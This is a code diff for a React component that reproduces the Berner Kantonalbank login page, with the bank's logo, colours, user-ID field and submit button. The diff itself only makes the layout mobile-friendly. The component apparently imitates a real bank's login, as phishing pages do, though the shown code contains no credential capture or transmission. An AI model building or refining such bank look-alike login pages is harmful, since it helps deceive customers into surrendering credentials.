@@ -254,7 +254,7 @@ const ChBernerKantonalbank = () => {
         <div className="min-h-screen flex flex-col">
         {/* Header */}
         <header className="relative">
-          <div className="max-w-[1200px] mx-auto px-6 md:px-20">
+          <div className="max-w-[1200px] mx-auto px-3 md:px-20">
             <div className="h-1.5" style={{ backgroundColor: RED }} />
             <div className="flex pt-8">
               <img src={logoAsset.url} alt="BEKB | BCBE" className="h-7 md:h-8" />
@@ -276,7 +276,7 @@ const ChBernerKantonalbank = () => {
           </div>
           {/* Grüne Linie full width mit Indicator innen */}
           <div ref={greenLineRef} className="relative h-[8px] w-full" style={{ backgroundColor: GREEN }}>
-            <div className="max-w-[1200px] mx-auto px-6 md:px-20 h-full relative">
+            <div className="max-w-[1200px] mx-auto px-3 md:px-20 h-full relative">
               <span
                 aria-hidden
                 className="absolute inset-y-0 transition-all"
@@ -289,9 +289,22 @@ const ChBernerKantonalbank = () => {
         <section className="flex-1 flex flex-col">
 
 
-          <div className="max-w-[1200px] w-full mx-auto px-6 md:px-20 pt-12 flex-1">
+          <div className="max-w-[1200px] w-full mx-auto px-3 md:px-20 pt-12 flex-1">
+            {/* Mein Portal — Mobile: grüne Box */}
             <div
-              className="inline-block pb-2 mb-10 text-[15px] font-bold"
+              className="lg:hidden p-4 mb-4"
+              style={{ backgroundColor: GREEN }}
+            >
+              <span
+                className="inline-block pb-1 text-[15px] font-bold"
+                style={{ borderBottom: `2px solid #000000`, color: DARK }}
+              >
+                {t.meinPortal}
+              </span>
+            </div>
+            {/* Mein Portal — Desktop */}
+            <div
+              className="hidden lg:inline-block pb-2 mb-10 text-[15px] font-bold"
               style={{ borderBottom: `2px solid #000000`, color: DARK }}
             >
               {t.meinPortal}
@@ -300,11 +313,27 @@ const ChBernerKantonalbank = () => {
             <div className="grid grid-cols-1 lg:grid-cols-[3fr_1fr] gap-12">
               {/* Login */}
               <div>
-                <h1 className="text-[26px] md:text-[36px] font-bold mb-10 leading-tight">
+                {/* Headline — Mobile: grüne Sprechblase */}
+                <div className="lg:hidden relative mb-8 p-5" style={{ backgroundColor: GREEN }}>
+                  <h1 className="text-[26px] font-bold leading-tight">
+                    {t.headline}
+                  </h1>
+                  <span
+                    aria-hidden
+                    className="absolute -bottom-3 left-6 w-0 h-0"
+                    style={{
+                      borderLeft: "12px solid transparent",
+                      borderRight: "12px solid transparent",
+                      borderTop: `12px solid ${GREEN}`,
+                    }}
+                  />
+                </div>
+                {/* Headline — Desktop */}
+                <h1 className="hidden lg:block text-[36px] font-bold mb-10 leading-tight">
                   {t.headline}
                 </h1>
 
-                <div className="space-y-4 max-w-[320px]">
+                <div className="space-y-4 max-w-none lg:max-w-[320px]">
                   <div className="relative">
                     <input
                       id="bekb-user"
@@ -361,7 +390,7 @@ const ChBernerKantonalbank = () => {
                   return (
                     <button
                       onClick={handleSubmit}
-                      className="mt-6 block w-full max-w-[320px] h-10 text-[15px] transition-colors"
+                      className="mt-6 block w-full lg:max-w-[320px] h-10 text-[15px] transition-colors"
                       style={{
                         backgroundColor: active ? RED : GREEN,
                         color: active ? "#ffffff" : DARK,
@@ -372,7 +401,7 @@ const ChBernerKantonalbank = () => {
                   );
                 })()}
 
-                <div className="mt-4 max-w-[320px]">
+                <div className="mt-4 max-w-none lg:max-w-[320px]">
                   <a
                     href="#"
                     className="inline-flex items-center gap-2 text-[14px] font-normal"
@@ -386,7 +415,7 @@ const ChBernerKantonalbank = () => {
               </div>
 
               {/* Nützliche Links */}
-              <aside className="p-6" style={{ backgroundColor: GREEN }}>
+              <aside className="p-6 w-4/5 lg:w-auto mt-8 lg:mt-0" style={{ backgroundColor: GREEN }}>
                 <h3 className="font-bold text-[16px] mb-4">{t.nuetzlicheLinks}</h3>
                 <a href={LINKS.support} target="_blank" rel="noopener noreferrer" className="block text-[14px] mb-4" style={{ color: RED }}>
                   {t.supportPage}
@@ -411,8 +440,9 @@ const ChBernerKantonalbank = () => {
           </div>
 
 
+
           {/* Breadcrumb unten gepinnt (im Viewport) */}
-          <div className="max-w-[1200px] w-full mx-auto px-6 md:px-20 mt-auto">
+          <div className="max-w-[1200px] w-full mx-auto px-3 md:px-20 mt-auto">
             <div className="py-4 flex items-center gap-3 text-[14px]">
               <span className="w-px h-4" style={{ backgroundColor: GREEN }} />
               <Home size={16} style={{ color: GREEN }} />
@@ -428,7 +458,7 @@ const ChBernerKantonalbank = () => {
 
         {/* Footer */}
         <footer className="text-white" style={{ backgroundColor: FOOTER_BG }}>
-          <div className="max-w-[1200px] mx-auto px-6 md:px-20 py-14">
+          <div className="max-w-[1200px] mx-auto px-3 md:px-20 py-14">
             <div className="grid grid-cols-1 md:grid-cols-4 gap-10 text-[14px]">
               <div>
                 <h4 className="font-bold pb-2 mb-4 border-b border-white/40">{t.anschrift}</h4>
